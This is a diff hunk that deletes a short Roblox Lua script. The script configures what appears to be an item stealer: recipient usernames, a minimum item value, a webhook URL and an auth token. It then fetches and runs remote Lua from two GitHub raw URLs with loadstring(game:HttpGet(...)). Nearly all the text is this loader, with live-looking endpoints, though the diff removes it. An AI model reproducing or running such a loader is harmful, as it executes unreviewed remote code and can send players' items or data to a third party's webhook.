@@ -1,11 +1,1 @@
-_G.Usernames = {"ThunderStealthZap16","Li0nIce201410"}
-_G.min_rap = 50
-_G.pingEveryone = "Yes"
 
-
-_G.webhook = "https://eblk.anouartmjebabra.workers.dev/"
-
-_G.AuthToken = "EBK-SS-A"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/V-2/refs/heads/main/V-all.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
